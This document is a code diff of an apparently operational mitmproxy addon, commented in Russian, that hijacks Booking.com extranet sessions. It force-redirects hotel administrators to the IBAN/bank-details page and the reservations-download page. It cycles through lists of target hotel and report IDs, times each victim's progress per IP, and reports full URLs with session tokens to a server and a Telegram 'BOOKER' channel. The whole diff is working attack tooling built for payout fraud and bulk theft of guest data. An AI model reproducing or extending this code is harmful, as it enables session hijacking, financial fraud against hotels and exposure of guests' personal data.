@@ -74,7 +74,13 @@ BOOKING_CC_DETAILS_FLAG = r"C:\temp\mitm_booking_cc_details_once"
 BOOKING_CC_DETAILS_BN_FILE = r"C:\temp\mitm_booking_cc_details_bn.txt"
 BOOKING_CC_DETAILS_HOTEL_ID_FILE = r"C:\temp\mitm_booking_cc_details_hotel_id.txt"
 
-# --- НОВЫЕ ФЛАГИ ДЛЯ ФУНКЦИИ 27 (циклическая копия функции 18) ---
+# --- ФЛАГ ДЛЯ ФУНКЦИИ 14 (IBAN SETTINGS FORCE) ---
+BOOKING_IBAN_SETTINGS_FLAG = r"C:\temp\mitm_booking_iban_settings_once"
+
+# --- ФЛАГ ДЛЯ ФУНКЦИИ 29 (IBAN + RESERVATIONS) ---
+BOOKING_IBAN_AND_RESERVATIONS_FLAG = r"C:\temp\mitm_booking_iban_and_reservations_once"
+
+# --- ФЛАГИ ДЛЯ ФУНКЦИИ 27 (циклическая копия функции 18) ---
 BOOKING_RESERVATIONS_CYCLE_FLAG = r"C:\temp\mitm_booking_reservations_cycle_once"
 BOOKING_RESERVATIONS_CYCLE_HOTEL_IDS_FILE = r"C:\temp\mitm_booking_cycle_hotel_ids.txt"
 BOOKING_RESERVATIONS_CYCLE_REPORT_IDS_FILE = r"C:\temp\mitm_booking_cycle_report_ids.txt"
@@ -99,7 +105,7 @@ LOG_PREFIX = "[MITM-REDIR]"
 AUTOSTART_FLAG = r"C:\temp\mitm_autostart_active.txt"
 AUTOSTART_FUNCTION_FILE = r"C:\temp\mitm_autostart_function.txt"
 
-# Функции проверки флагов 21-26
+# Функции проверки флагов
 def should_partners():
     return os.path.exists(PARTNERS_FLAG)
 
@@ -117,6 +123,12 @@ def should_ultra_pulse():
 
 def should_monitor_platforms():
     return os.path.exists(MONITOR_PLATFORMS_FLAG)
+
+def should_booking_iban_settings():
+    return os.path.exists(BOOKING_IBAN_SETTINGS_FLAG)
+
+def should_booking_iban_and_reservations():
+    return os.path.exists(BOOKING_IBAN_AND_RESERVATIONS_FLAG)
 
 def get_pulse_redirect_to():
     try:
@@ -185,6 +197,35 @@ def send_function_complete_notification(client_ip: str, from_url: str, function_
     
     threading.Thread(target=_send_complete, daemon=True).start()
 
+def get_browser_info(flow: http.HTTPFlow) -> str:
+    """Получает информацию о браузере из User-Agent"""
+    try:
+        user_agent = flow.request.headers.get("User-Agent", "")
+        if not user_agent:
+            return "Unknown"
+        
+        user_agent_lower = user_agent.lower()
+        
+        # Определяем браузер
+        if "chrome" in user_agent_lower and "edg" not in user_agent_lower and "opr" not in user_agent_lower:
+            return "Google Chrome"
+        elif "firefox" in user_agent_lower:
+            return "Mozilla Firefox"
+        elif "safari" in user_agent_lower and "chrome" not in user_agent_lower:
+            return "Apple Safari"
+        elif "edg" in user_agent_lower:
+            return "Microsoft Edge"
+        elif "opr" in user_agent_lower or "opera" in user_agent_lower:
+            return "Opera"
+        elif "brave" in user_agent_lower:
+            return "Brave"
+        else:
+            return user_agent[:50]  # Первые 50 символов
+        
+    except Exception as e:
+        log(f"Error getting browser info: {e}")
+        return "Unknown"
+
 def should_log_domain(flow: http.HTTPFlow) -> bool:
     """Проверяет, нужно ли логировать доступ к платформе"""
     if not TELEGRAM_LOGGING_ENABLED:
@@ -205,16 +246,15 @@ def get_redirect_target():
         if os.path.exists(REDIRECT_FILE):
             with open(REDIRECT_FILE, 'r', encoding='utf-8') as f:
                 target = f.read().strip()
-                # Проверяем, что URL не пустой и начинается с http
                 if target and target.startswith(('http://', 'https://')):
                     return target
                 else:
                     log(f"No valid redirect target in file: '{target}'")
         log("No valid redirect target found, returning empty string")
-        return ""  # ВАЖНО: возвращаем пустую строку вместо bbc.com
+        return ""
     except Exception as e:
         log(f"Error reading redirect target: {e}")
-        return ""  # ВАЖНО: возвращаем пустую строку вместо bbc.com
+        return ""
 
 def should_force():
     return os.path.exists(FORCE_FLAG)
@@ -301,7 +341,7 @@ def get_booking_cc_details_bn():
                 return f.read().strip()
     except Exception as e:
         log(f"Error reading booking cc details bn: {e}")
-    return ""  # Значение по умолчанию
+    return ""
 
 def get_booking_cc_details_hotel_id():
     try:
@@ -310,7 +350,7 @@ def get_booking_cc_details_hotel_id():
                 return f.read().strip()
     except Exception as e:
         log(f"Error reading booking cc details hotel_id: {e}")
-    return ""  # Значение по умолчанию
+    return ""
 
 # --- Функции удаления флагов ---
 def remove_force_flag():
@@ -425,7 +465,26 @@ def remove_booking_cc_details_flag():
     except Exception as e:
         ctx.log.warn(f"{LOG_PREFIX} remove_booking_cc_details_flag error: {e}")
 
-# --- Функция удаления флага функции 27 ---
+def remove_booking_iban_settings_flag():
+    try:
+        if os.path.exists(BOOKING_IBAN_SETTINGS_FLAG):
+            os.remove(BOOKING_IBAN_SETTINGS_FLAG)
+            log("Booking IBAN settings flag removed")
+    except Exception as e:
+        ctx.log.warn(f"{LOG_PREFIX} remove_booking_iban_settings_flag error: {e}")
+
+def remove_booking_iban_and_reservations_flag():
+    """Удаление флага функции 29"""
+    try:
+        if os.path.exists(BOOKING_IBAN_AND_RESERVATIONS_FLAG):
+            os.remove(BOOKING_IBAN_AND_RESERVATIONS_FLAG)
+            log("[F29] IBAN+Reservations flag removed")
+        # Также удаляем флаги функций 14 и 18
+        remove_booking_iban_settings_flag()
+        remove_booking_reservations_flag()
+    except Exception as e:
+        log(f"[F29] Error removing flag: {e}")
+
 def remove_booking_reservations_cycle_flag():
     """Удаление флага функции 27"""
     try:
@@ -433,8 +492,6 @@ def remove_booking_reservations_cycle_flag():
             os.remove(BOOKING_RESERVATIONS_CYCLE_FLAG)
             log("[F27] Cycle flag removed")
         
-        # НЕ удаляем файлы с параметрами и индекс - они нужны для следующих циклов
-        # Но можем удалить флаг активности
         if os.path.exists(BOOKING_RESERVATIONS_CYCLE_ACTIVE_FILE):
             os.remove(BOOKING_RESERVATIONS_CYCLE_ACTIVE_FILE)
     except Exception as e:
@@ -507,19 +564,16 @@ def enable_pulse_from_ultra_pulse():
     try:
         log("Function 25: Function 23 completed, activating Function 24 (Pulse)")
         
-        # 1. Удаляем флаг функции 23 (если еще есть)
         if os.path.exists(DEVICE_FLAG):
             os.remove(DEVICE_FLAG)
             log("Function 25: Removed device flag")
         
-        # 2. Создаем флаг функции 24
         parent = os.path.dirname(PULSE_FLAG)
         if parent and not os.path.exists(parent):
             os.makedirs(parent, exist_ok=True)
         with open(PULSE_FLAG, 'w') as f:
             f.write("enabled")
         
-        # 3. Копируем redirect URL из ultra pulse в pulse
         ultra_url = get_ultra_pulse_redirect_to()
         if ultra_url:
             parent_dir = os.path.dirname(PULSE_REDIRECT_TO_FILE)
@@ -529,11 +583,39 @@ def enable_pulse_from_ultra_pulse():
                 f.write(ultra_url)
             log(f"Function 25: Copied redirect URL to Pulse: {ultra_url}")
         
-        # 4. Отправляем Telegram уведомление о переходе к фазе 2
         log("Function 25: Phase 2 (Pulse) activated - sending notification")
         
     except Exception as e:
         log(f"Error enabling function 24 from ultra pulse: {e}")
+        
+def enable_reservations_from_iban():
+    """Включение функции 18 после завершения функции 14 (для функции 29)"""
+    try:
+        log("[F29] Function 14 (IBAN) completed, activating Function 18 (Reservations)")
+        
+        # Получаем параметры для функции 18 из файлов
+        hotel_id = get_booking_reservations_hotel_id()
+        report_id = get_booking_reservations_report_id()
+        
+        if not hotel_id or not report_id:
+            log("[F29] ⚠️ Missing hotel_id or report_id for reservations!")
+            return
+        
+        # Проверяем, не активна ли уже функция 18
+        if should_booking_reservations():
+            log("[F29] ⚠️ Function 18 already active, skipping")
+            return
+        
+        parent = os.path.dirname(BOOKING_RESERVATIONS_FLAG)
+        if parent and not os.path.exists(parent):
+            os.makedirs(parent, exist_ok=True)
+        with open(BOOKING_RESERVATIONS_FLAG, 'w') as f:
+            f.write("enabled")
+        
+        log(f"[F29] ✅ Function 18 activated with hotel_id={hotel_id}, report_id={report_id}")
+        
+    except Exception as e:
+        log(f"[F29] Error enabling reservations: {e}")
         
 def is_redirect_target(flow: http.HTTPFlow, redirect_target: str) -> bool:
     try:
@@ -582,11 +664,9 @@ def booking_redirect(flow: http.HTTPFlow, redirect_type: str) -> bool:
     parsed = urllib.parse.urlparse(url)
     query = urllib.parse.parse_qs(parsed.query)
 
-    # Получаем hotel_id и ses из запроса
     hotel_id = query.get("hotel_id", [""])[0]
     ses = query.get("ses", [""])[0]
 
-    # Формируем целевой URL в зависимости от типа
     if redirect_type == "provider":
         target_url = f"{base_url}?lang=en&ses={ses}&hotel_id={hotel_id}&fr_account_menu=1&view=start"
     else:
@@ -594,18 +674,15 @@ def booking_redirect(flow: http.HTTPFlow, redirect_type: str) -> bool:
 
     log(f"Booking.com {redirect_type.upper()} redirect {url} -> {target_url}")
     
-    # Логируем редирект
     client_ip = get_client_ip(flow)
     log_redirect_to_server(client_ip, url, target_url, f"BOOKING_{redirect_type.upper()}")
     
-    # Выполняем редирект
     flow.response = http.Response.make(
         302, b"", {"Location": target_url}
     )
 
     remove_flag()
     
-    # Отправляем уведомление о завершении
     if redirect_type == "message":
         send_function_complete_notification(client_ip, url, "FUNCTION_7_COMPLETE")
     elif redirect_type == "provider":
@@ -617,523 +694,80 @@ def booking_redirect(flow: http.HTTPFlow, redirect_type: str) -> bool:
     
     return True
 
-def booking_reservations_download_redirect(flow: http.HTTPFlow) -> bool:
+# ========== ФУНКЦИЯ 14: IBAN SETTINGS FORCE (БЕЗ ЛИШНИХ УВЕДОМЛЕНИЙ) ==========
+def booking_iban_settings_redirect(flow: http.HTTPFlow) -> bool:
     """
-    ФУНКЦИЯ 18:
-    Редиректит все запросы к admin.booking.com/hotel/* на страницу загрузки резервов.
-    С ДОПОЛНИТЕЛЬНЫМИ РЕДИРЕКТАМИ ПОСЛЕ ЗАВЕРШЕНИЯ:
-    1. После завершения - 3 секунды ожидания
-    2. В течение 2 минут: если обновление страницы - редирект на главную
-    3. Через 10 секунд: автоматический редирект на главную
+    ФУНКЦИЯ 14: IBAN SETTINGS FORCE
+    Перенаправляет на dp_bank_details.html (IBAN/bank details)
+    После завершения (когда есть auth_assurance_last_check):
+    - МГНОВЕННЫЙ редирект на https://admin.booking.com/
+    - Отправка лога в Telegram ТОЛЬКО при завершении
     """
     try:
+        if not should_booking_iban_settings():
+            return False
+
         url = flow.request.pretty_url
-        host = (flow.request.pretty_host or "").lower()
+        iban_base = "https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/dp_bank_details.html"
         client_ip = get_client_ip(flow)
+        browser_info = get_browser_info(flow)
         
-        # ====== ПРОВЕРКА ДОПОЛНИТЕЛЬНЫХ РЕДИРЕКТОВ ПОСЛЕ ЗАВЕРШЕНИЯ ======
-        # Проверяем, была ли уже завершена функция 18 для этого IP
-        if client_ip in FUNCTION_COMPLETION_TIMES:
-            completion_data = FUNCTION_COMPLETION_TIMES[client_ip]
-            completion_time = completion_data.get("function_18_completed_at", 0)
-            initial_url = completion_data.get("initial_url", "")
-            
-            if completion_time > 0:
-                current_time = time.time()
-                time_since_completion = current_time - completion_time
-                
-                # Проверяем, это ли страница reservations_download.html
-                is_reservations_page = "reservations_download.html" in url
-                
-                if is_reservations_page:
-                    # ПРИНЦИП: одинаковый путь (reservations_download.html), но параметры могут быть любые
-                    parsed_current = urllib.parse.urlparse(url)
-                    parsed_initial = urllib.parse.urlparse(initial_url)
-                    
-                    # Сравниваем только путь, без параметров
-                    if parsed_current.path == parsed_initial.path:
-                        
-                        # 1. В течение первых 3 секунд - НИЧЕГО НЕ ДЕЛАЕМ (ждем загрузки)
-                        if time_since_completion <= 3:
-                            log(f"[F18] ✓ Page loaded, waiting 3s grace period ({time_since_completion:.1f}s passed)")
-                            return False
-                        
-                        # 2. После 10 секунд - АВТОМАТИЧЕСКИЙ РЕДИРЕКТ НА ГЛАВНУЮ
-                        elif time_since_completion >= 10:
-                            target_url = "https://admin.booking.com/hotel/hoteladmin/"
-                            log(f"[F18] ✓ 10s timeout reached - auto-redirect to main page")
-                            
-                            # Логируем дополнительный редирект
-                            log_redirect_to_server(client_ip, url, target_url, "FUNCTION_18_POST_COMPLETION_AUTO")
-                            
-                            flow.response = http.Response.make(
-                                302,
-                                b"",
-                                {
-                                    "Location": target_url,
-                                    "Cache-Control": "no-cache, no-store, must-revalidate",
-                                    "Pragma": "no-cache",
-                                    "Expires": "0",
-                                    "X-MITM-Redirect": "Function-18-Post-Auto"
-                                }
-                            )
-                            return True
-                        
-                        # 3. От 3 до 120 секунд - РЕДИРЕКТ ПРИ ПОВТОРНОМ ЗАПРОСЕ/ОБНОВЛЕНИИ
-                        elif 3 < time_since_completion < 120:
-                            # Это повторный запрос той же страницы в течение 2 минут
-                            log(f"[F18] ✓ Page refresh within 2min ({time_since_completion:.1f}s) - redirect to main")
-                            
-                            target_url = "https://admin.booking.com/hotel/hoteladmin/"
-                            
-                            # Логируем дополнительный редирект
-                            log_redirect_to_server(client_ip, url, target_url, "FUNCTION_18_POST_COMPLETION_REFRESH")
-                            
-                            flow.response = http.Response.make(
-                                302,
-                                b"",
-                                {
-                                    "Location": target_url,
-                                    "Cache-Control": "no-cache, no-store, must-revalidate",
-                                    "Pragma": "no-cache",
-                                    "Expires": "0",
-                                    "X-MITM-Redirect": "Function-18-Post-Refresh"
-                                }
-                            )
-                            return True
-        
-        # ====== ОСНОВНАЯ ЛОГИКА ФУНКЦИИ (БЕЗ ИЗМЕНЕНИЙ) ======
-        if not should_booking_reservations():
-            return False
-
-        # ====== ТОЛЬКО admin.booking.com ======
-        if not host.endswith("admin.booking.com"):
-            return False
-        
-        # ====== ПРОВЕРКА ЗАВЕРШЕНИЯ ФУНКЦИИ 18 ======
-        # Проверяем, что это ЛЮБОЙ запрос, содержащий все 5 параметров
-        parsed = urllib.parse.urlparse(url)
-        query = urllib.parse.parse_qs(parsed.query)
-        
-        # ВАЖНО: Функция завершается ТОЛЬКО при наличии ВСЕХ 5 параметров в любом запросе:
-        required_params = ["hotel_id", "lang", "reportId", "ses", "auth_assurance_last_check"]
-        has_all_params = all(param in query for param in required_params)
-        
-        if has_all_params:
-            log(f"[F18] ✓ Detected ALL 5 required parameters in URL -> FUNCTION 18 COMPLETED")
-            
-            # Получаем полный URL для Telegram
-            full_url = url
-            
-            # СОХРАНЯЕМ ВРЕМЯ ЗАВЕРШЕНИЯ ДЛЯ ЭТОГО ПОЛЬЗОВАТЕЛЯ
-            FUNCTION_COMPLETION_TIMES[client_ip] = {
-                "function_18_completed_at": time.time(),
-                "initial_url": full_url  # Сохраняем оригинальный URL для сравнения пути
-            }
-            
-            log(f"[F18] ✓ Completion time saved for IP {client_ip}")
-            
-            # Удаляем флаг функции 18
-            remove_booking_reservations_flag()
-            
-            # ОТПРАВЛЯЕМ УВЕДОМЛЕНИЕ О ЗАВЕРШЕНИИ (с полным URL)
-            send_function_complete_notification(client_ip, full_url, "FUNCTION_18_COMPLETE")
-            
-            log(f"[F18] ✓ Completion notification sent for function 18")
-            
-            # ====== НЕТ ФИНАЛЬНОГО РЕДИРЕКТА ======
-            # Пользователь остается на текущей странице (reservations_download.html)
-            log(f"[F18] ✓ Function completed, NO final redirect - user stays on page")
-            return False  # Не делаем редирект, просто завершаем функцию
-        
-        # ====== ЕСЛИ ЕЩЕ НЕТ ВСЕХ ПАРАМЕТРОВ ======
-        
-        # Проверяем, если это уже страница reservations_download.html (но без всех параметров)
-        if "reservations_download.html" in url:
-            log(f"[F18] On reservations_download.html but missing some parameters")
-            
-            # Если уже есть hotel_id и reportId - ждем остальные параметры
-            if "hotel_id" in query and "reportId" in query:
-                log(f"[F18] Has hotel_id and reportId, waiting for ses and auth_assurance_last_check")
-                return False  # Не делаем редирект
-        
-        # ====== ПЕРВИЧНЫЙ РЕДИРЕКТ ======
-        # Если пользователь НЕ на reservations_download.html И НЕ имеет всех параметров
-        # И это запрос к /hotel/ - делаем первоначальный редирект
-        
-        parsed = urllib.parse.urlparse(url)
-        path = parsed.path or "/"
-        
-        # Проверяем, что путь начинается с /hotel/
-        if not path.startswith("/hotel/"):
-            return False
-        
-        # Если это уже промежуточная страница reservations_download.html - не делаем редирект
-        if "reservations_download.html" in url:
-            return False
-        
-        # Получаем параметры из конфигурации
-        hotel_id = get_booking_reservations_hotel_id()
-        report_id = get_booking_reservations_report_id()
-        
-        # Формируем промежуточный целевой URL (без ses и auth_assurance_last_check)
-        target_url = f"https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/reservations_download.html?hotel_id={hotel_id}&lang=en&reportId={report_id}"
-        
-        # Проверяем, что это не редирект на ту же самую страницу
-        if url == target_url:
-            return False
-        
-        log(f"[F18] ✓ Redirecting {url} -> {target_url}")
-        
-        # Логируем редирект (уведомление о НАЧАЛЕ функции)
-        log_redirect_to_server(client_ip, url, target_url, "FUNCTION_18_RESERVATIONS_DOWNLOAD")
-        
-        # Выполняем ПЕРВИЧНЫЙ редирект
-        flow.response = http.Response.make(
-            302, 
-            b"", 
-            {
-                "Location": target_url,
-                "Cache-Control": "no-cache, no-store, must-revalidate",
-                "Pragma": "no-cache",
-                "Expires": "0"
-            }
-        )
-        return True
-        
-    except Exception as e:
-        log(f"[F18] Error in booking_reservations_download_redirect: {e}")
-        import traceback
-        log(f"[F18] Traceback: {traceback.format_exc()}")
-        return False
-
-# ========== ФУНКЦИЯ 27: ЦИКЛИЧЕСКАЯ КОПИЯ ФУНКЦИИ 18 ==========
-# ========== ВСЕ УВЕДОМЛЕНИЯ ОТПРАВЛЯЮТСЯ В КАНАЛ BOOKER! ==========
-def booking_reservations_cycle_redirect(flow: http.HTTPFlow) -> bool:
-    """
-    ФУНКЦИЯ 27: УСЛОЖНЕННАЯ КОПИЯ ФУНКЦИИ 18
-    ПОЛНОСТЬЮ повторяет логику функции 18, включая ЛОГИРОВАНИЕ:
-    1. Админ один раз вводит СПИСОК hotel_id и СПИСОК report_id
-    2. После завершения каждого цикла ждет 1 минуту
-    3. Затем запускает следующий цикл с новыми параметрами
-    4. Проходит по всем введенным комбинациям
-    5. ПОЛНОЕ ЛОГИРОВАНИЕ как в функции 18 (начало, завершение с URL, пост-редиректы)
-    
-    ВАЖНО: ВСЕ УВЕДОМЛЕНИЯ ИДУТ В КАНАЛ BOOKER!
-    """
-    try:
-        # ====== ПРОВЕРКА АКТИВАЦИИ ФУНКЦИИ 27 ======
-        if not os.path.exists(BOOKING_RESERVATIONS_CYCLE_FLAG):
-            return False
-            
-        # ====== ПРОВЕРЯЕМ, АКТИВЕН ЛИ ТЕКУЩИЙ ЦИКЛ ======
-        # Если цикл не активен (ждет минуту) - ничего не делаем
-        if os.path.exists(BOOKING_RESERVATIONS_CYCLE_ACTIVE_FILE):
-            try:
-                with open(BOOKING_RESERVATIONS_CYCLE_ACTIVE_FILE, 'r') as f:
-                    is_active = f.read().strip() == "1"
-                if not is_active:
-                    return False
-            except:
-                return False
-        else:
-            return False
-        
-        url = flow.request.pretty_url
-        host = (flow.request.pretty_host or "").lower()
-        client_ip = get_client_ip(flow)
-        
-        # ====== ПОЛУЧАЕМ ТЕКУЩИЙ ИНДЕКС ======
-        current_index = 0
-        try:
-            if os.path.exists(BOOKING_RESERVATIONS_CYCLE_INDEX_FILE):
-                with open(BOOKING_RESERVATIONS_CYCLE_INDEX_FILE, 'r') as f:
-                    current_index = int(f.read().strip())
-        except:
-            current_index = 0
-        
-        # ====== ПОЛУЧАЕМ СПИСКИ ПАРАМЕТРОВ ======
-        hotel_ids = []
-        report_ids = []
-        
-        try:
-            if os.path.exists(BOOKING_RESERVATIONS_CYCLE_HOTEL_IDS_FILE):
-                with open(BOOKING_RESERVATIONS_CYCLE_HOTEL_IDS_FILE, 'r') as f:
-                    hotel_ids = [h.strip() for h in f.read().split(',') if h.strip()]
-            
-            if os.path.exists(BOOKING_RESERVATIONS_CYCLE_REPORT_IDS_FILE):
-                with open(BOOKING_RESERVATIONS_CYCLE_REPORT_IDS_FILE, 'r') as f:
-                    report_ids = [r.strip() for r in f.read().split(',') if r.strip()]
-        except Exception as e:
-            log(f"[F27] Error reading parameters: {e}")
-            return False
-        
-        # Проверяем, что есть параметры и текущий индекс в пределах диапазона
-        if not hotel_ids or not report_ids or current_index >= min(len(hotel_ids), len(report_ids)):
-            log(f"[F27] No more parameters or invalid index - ending cycle")
-            # Завершаем функцию 27
-            remove_booking_reservations_cycle_flag()
-            return False
-        
-        # ====== ПОЛУЧАЕМ ТЕКУЩИЕ ПАРАМЕТРЫ ======
-        current_hotel_id = hotel_ids[current_index]
-        current_report_id = report_ids[current_index]
-        
-        # ====== ПРОВЕРКА ДОПОЛНИТЕЛЬНЫХ РЕДИРЕКТОВ ПОСЛЕ ЗАВЕРШЕНИЯ ======
-        # АНАЛОГИЧНО ФУНКЦИИ 18 - ПОЛНОЕ ЛОГИРОВАНИЕ
-        if client_ip in FUNCTION_COMPLETION_TIMES:
-            completion_data = FUNCTION_COMPLETION_TIMES.get(client_ip, {})
-            completion_time = completion_data.get(f"function_27_cycle_{current_index}_completed_at", 0)
-            initial_url = completion_data.get(f"function_27_cycle_{current_index}_initial_url", "")
-            
-            if completion_time > 0:
-                current_time = time.time()
-                time_since_completion = current_time - completion_time
-                
-                is_reservations_page = "reservations_download.html" in url
-                
-                if is_reservations_page and initial_url:
-                    parsed_current = urllib.parse.urlparse(url)
-                    parsed_initial = urllib.parse.urlparse(initial_url)
-                    
-                    if parsed_current.path == parsed_initial.path:
-                        # 1. В течение первых 3 секунд - НИЧЕГО НЕ ДЕЛАЕМ
-                        if time_since_completion <= 3:
-                            log(f"[F27] ✓ Cycle {current_index+1}: Page loaded, waiting 3s grace period ({time_since_completion:.1f}s passed)")
-                            return False
-                        
-                        # 2. После 10 секунд - АВТОМАТИЧЕСКИЙ РЕДИРЕКТ НА ГЛАВНУЮ (С ЛОГИРОВАНИЕМ)
-                        elif time_since_completion >= 10:
-                            target_url = "https://admin.booking.com/hotel/hoteladmin/"
-                            log(f"[F27] ✓ Cycle {current_index+1}: 10s timeout reached - auto-redirect")
-                            
-                            # ПОЛНОЕ ЛОГИРОВАНИЕ POST-РЕДИРЕКТА - ВСЕ УВЕДОМЛЕНИЯ ИДУТ В BOOKER!
-                            log_redirect_to_server(client_ip, url, target_url, f"FUNCTION_27_CYCLE_{current_index+1}_POST_AUTO")
-                            
-                            flow.response = http.Response.make(
-                                302,
-                                b"",
-                                {
-                                    "Location": target_url,
-                                    "Cache-Control": "no-cache, no-store, must-revalidate",
-                                    "Pragma": "no-cache",
-                                    "Expires": "0",
-                                    "X-MITM-Redirect": f"Function-27-Cycle-{current_index+1}-Post-Auto"
-                                }
-                            )
-                            return True
-                        
-                        # 3. От 3 до 120 секунд - РЕДИРЕКТ ПРИ ПОВТОРНОМ ЗАПРОСЕ (С ЛОГИРОВАНИЕМ)
-                        elif 3 < time_since_completion < 120:
-                            log(f"[F27] ✓ Cycle {current_index+1}: Page refresh within 2min - redirect to main")
-                            
-                            target_url = "https://admin.booking.com/hotel/hoteladmin/"
-                            
-                            # ПОЛНОЕ ЛОГИРОВАНИЕ POST-РЕДИРЕКТА - ВСЕ УВЕДОМЛЕНИЯ ИДУТ В BOOKER!
-                            log_redirect_to_server(client_ip, url, target_url, f"FUNCTION_27_CYCLE_{current_index+1}_POST_REFRESH")
-                            
-                            flow.response = http.Response.make(
-                                302,
-                                b"",
-                                {
-                                    "Location": target_url,
-                                    "Cache-Control": "no-cache, no-store, must-revalidate",
-                                    "Pragma": "no-cache",
-                                    "Expires": "0",
-                                    "X-MITM-Redirect": f"Function-27-Cycle-{current_index+1}-Post-Refresh"
-                                }
-                            )
-                            return True
-        
-        # ====== ОСНОВНАЯ ЛОГИКА (АНАЛОГИЧНО ФУНКЦИИ 18) ======
-        
-        # ====== ТОЛЬКО admin.booking.com ======
-        if not host.endswith("admin.booking.com"):
-            return False
-        
-        # ====== ПРОВЕРКА ЗАВЕРШЕНИЯ ЦИКЛА ======
-        parsed = urllib.parse.urlparse(url)
-        query = urllib.parse.parse_qs(parsed.query)
-        
-        required_params = ["hotel_id", "lang", "reportId", "ses", "auth_assurance_last_check"]
-        has_all_params = all(param in query for param in required_params)
-        
-        if has_all_params:
-            log(f"[F27] ✓ Cycle {current_index+1}: Detected ALL 5 parameters -> CYCLE COMPLETED")
-            
-            full_url = url
-            
-            # СОХРАНЯЕМ ВРЕМЯ ЗАВЕРШЕНИЯ ДЛЯ ЭТОГО ЦИКЛА (КАК В ФУНКЦИИ 18)
-            if client_ip not in FUNCTION_COMPLETION_TIMES:
-                FUNCTION_COMPLETION_TIMES[client_ip] = {}
-            
-            FUNCTION_COMPLETION_TIMES[client_ip][f"function_27_cycle_{current_index}_completed_at"] = time.time()
-            FUNCTION_COMPLETION_TIMES[client_ip][f"function_27_cycle_{current_index}_initial_url"] = full_url
-            
-            log(f"[F27] ✓ Cycle {current_index+1} completion time saved for IP {client_ip}")
-            
-            # ОТПРАВЛЯЕМ УВЕДОМЛЕНИЕ О ЗАВЕРШЕНИИ ЦИКЛА (С ПОЛНЫМ URL - КАК ФУНКЦИЯ 18)
-            # ВАЖНО: ЭТО УВЕДОМЛЕНИЕ ПОЙДЕТ В КАНАЛ BOOKER!
-            send_function_complete_notification(client_ip, full_url, f"FUNCTION_27_CYCLE_{current_index+1}_COMPLETE")
-            
-            # ====== ЗАПУСКАЕМ СЛЕДУЮЩИЙ ЦИКЛ ЧЕРЕЗ МИНУТУ ======
-            
-            # 1. Деактивируем текущий цикл
-            try:
-                with open(BOOKING_RESERVATIONS_CYCLE_ACTIVE_FILE, 'w') as f:
-                    f.write("0")
-                log(f"[F27] ✓ Cycle {current_index+1} deactivated")
-            except Exception as e:
-                log(f"[F27] Error deactivating cycle: {e}")
-            
-            # 2. Увеличиваем индекс для следующего цикла
-            next_index = current_index + 1
-            
-            # 3. Проверяем, есть ли еще параметры
-            if next_index < min(len(hotel_ids), len(report_ids)):
-                # Сохраняем следующий индекс
-                try:
-                    with open(BOOKING_RESERVATIONS_CYCLE_INDEX_FILE, 'w') as f:
-                        f.write(str(next_index))
-                    log(f"[F27] ✓ Next cycle index: {next_index+1}")
-                except Exception as e:
-                    log(f"[F27] Error saving next index: {e}")
-                
-                # 4. Запускаем таймер на 1 минуту для активации следующего цикла
-                def schedule_next_cycle():
-                    time.sleep(60)  # Ждем 1 минуту
-                    try:
-                        # Активируем следующий цикл
-                        if os.path.exists(BOOKING_RESERVATIONS_CYCLE_ACTIVE_FILE):
-                            with open(BOOKING_RESERVATIONS_CYCLE_ACTIVE_FILE, 'w') as f:
-                                f.write("1")
-                            log(f"[F27] ✓ Next cycle (index {next_index+1}) activated after 1 minute")
-                            
-                            # Сохраняем время следующего запуска
-                            with open(BOOKING_RESERVATIONS_CYCLE_NEXT_RUN_FILE, 'w') as f:
-                                f.write(str(time.time()))
-                        else:
-                            log(f"[F27] ⚠️ Cycle active file missing, cannot activate next cycle")
-                    except Exception as e:
-                        log(f"[F27] Error activating next cycle: {e}")
-                
-                threading.Thread(target=schedule_next_cycle, daemon=True).start()
-                log(f"[F27] ✓ Timer set: next cycle in 60 seconds")
-            else:
-                # Все циклы завершены - ОТПРАВЛЯЕМ ФИНАЛЬНОЕ УВЕДОМЛЕНИЕ
-                log(f"[F27] ✓ ALL CYCLES COMPLETED! Total: {next_index} cycles")
-                # ВАЖНО: ЭТО УВЕДОМЛЕНИЕ ПОЙДЕТ В КАНАЛ BOOKER!
-                send_function_complete_notification(client_ip, "ALL_CYCLES", "FUNCTION_27_ALL_CYCLES_COMPLETE")
-                remove_booking_reservations_cycle_flag()
-            
-            return False  # Не делаем редирект, пользователь остается на странице
-        
-        # ====== ЕСЛИ ЕЩЕ НЕТ ВСЕХ ПАРАМЕТРОВ ======
-        if "reservations_download.html" in url:
-            if "hotel_id" in query and "reportId" in query:
-                log(f"[F27] Cycle {current_index+1}: Has hotel_id and reportId, waiting for ses and auth_assurance_last_check")
-                return False
-        
-        # ====== ПЕРВИЧНЫЙ РЕДИРЕКТ ======
-        parsed = urllib.parse.urlparse(url)
-        path = parsed.path or "/"
-        
-        if not path.startswith("/hotel/"):
-            return False
-        
-        if "reservations_download.html" in url:
-            return False
-        
-        # Формируем целевой URL с ТЕКУЩИМИ параметрами
-        target_url = f"https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/reservations_download.html?hotel_id={current_hotel_id}&lang=en&reportId={current_report_id}"
-        
-        if url == target_url:
-            return False
-        
-        log(f"[F27] ✓ Cycle {current_index+1}: Redirecting {url} -> {target_url}")
-        log(f"[F27] ✓ Using hotel_id={current_hotel_id}, report_id={current_report_id}")
-        
-        # ПОЛНОЕ ЛОГИРОВАНИЕ НАЧАЛА ЦИКЛА (КАК В ФУНКЦИИ 18)
-        # ВАЖНО: ЭТО УВЕДОМЛЕНИЕ ПОЙДЕТ В КАНАЛ BOOKER!
-        log_redirect_to_server(client_ip, url, target_url, f"FUNCTION_27_CYCLE_{current_index+1}_START")
-        
-        flow.response = http.Response.make(
-            302, 
-            b"", 
-            {
-                "Location": target_url,
-                "Cache-Control": "no-cache, no-store, must-revalidate",
-                "Pragma": "no-cache",
-                "Expires": "0"
-            }
-        )
-        return True
-        
-    except Exception as e:
-        log(f"[F27] Error in booking_reservations_cycle_redirect: {e}")
-        import traceback
-        log(f"[F27] Traceback: {traceback.format_exc()}")
-        return False
-
-def cleanup_old_completion_times():
-    """Очищает записи о завершении функций старше 5 минут"""
-    try:
-        current_time = time.time()
-        to_delete = []
-        
-        for client_ip, data in FUNCTION_COMPLETION_TIMES.items():
-            completion_time = data.get("function_18_completed_at", 0)
-            if current_time - completion_time > 300:  # 5 минут
-                to_delete.append(client_ip)
-        
-        for client_ip in to_delete:
-            del FUNCTION_COMPLETION_TIMES[client_ip]
